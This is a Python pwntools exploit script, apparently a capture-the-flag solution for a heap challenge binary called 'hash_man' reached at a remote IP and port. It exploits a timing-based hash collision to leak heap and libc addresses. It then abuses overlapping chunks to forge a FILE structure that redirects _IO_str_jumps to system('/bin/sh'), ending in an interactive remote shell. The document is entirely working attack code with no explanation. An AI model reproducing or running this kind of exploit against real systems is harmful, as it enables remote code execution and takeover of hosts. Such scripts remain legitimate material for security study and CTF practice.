from pwn import *

import sys

import time

context.arch = "amd64"

#r = process(["./hash_man"],env={"LD_PRELOAD":"./libc-2.23.so"})

r = remote("185.168.131.14", 6000)

def create_sha(key,size,text,feedback):
	r.sendlineafter(">>","1")
	r.sendlineafter(":",str(key))
	r.sendlineafter(":",str(size))
	r.sendafter(":",text)
	r.sendafter(":",feedback)

def show(idx,key,wait):
	r.sendlineafter(">>","9")
	r.sendlineafter("?",str(idx))
	r.recvuntil(":")
	if wait:
		r.recvuntil("collision")
	r.sendline(str(key))

def edit(idx,key,wait,text,feedback):
	r.sendlineafter(">>","8")
	r.sendlineafter("?",str(idx))
	r.recvuntil(":")
	if wait:
		r.recvuntil("collision")
	r.sendline(str(key))
	r.sendafter(":",text)
	r.sendafter(":",feedback)

def remove(idx,key):
	r.sendlineafter(">>","7")
	r.sendlineafter("?",str(idx))
	r.sendlineafter(":",str(key))

def reset_clock():
	r.sendlineafter(">>","10")


lol = float(sys.argv[1])


create_sha(200,0x10,"a","a")
reset_clock()
time.sleep(lol)
create_sha(200,0x10,"a","a")
show(1,0,True)
r.recvuntil("Feedback: ")
heap = u64(r.recvn(0x18)[8:16])-0x1f0
print hex(heap)

create_sha(202,0xa0,"a","a") #1


create_sha(203,0x10,"a","a"*8+p64(heap+0x388)) #2
create_sha(201,0x10,"a","a") #3
remove(2,203)

reset_clock()
time.sleep(lol)
create_sha(200,0x10,"a","a"*8+p64(heap+0x388)) #2
edit(2,0,True,flat(0x200,heap+0x260),"a")
remove(1,202)
show(3,201,False)

r.recvuntil("Plaintext: ")
libc = u64(r.recvline()[:-1].ljust(8,'\x00'))- 0x3c4b78

print hex(libc)



system = libc + 0x45390
io_str_jumps = libc + 0x3c37a0
io_list_all = libc+ 0x3c5520
binsh = libc + 0x18cd57
FILE = flat(0x0,io_list_all-0x10,0x0,0x1,0x0,binsh)

edit(3,201,False,FILE.ljust(0xc8,'\x00')+p64(io_str_jumps-0x8)+p64(system)*2,"a")

r.sendlineafter(">>","1")
r.sendlineafter(":","211")
r.sendlineafter(":",str(0xc0))

r.interactive()
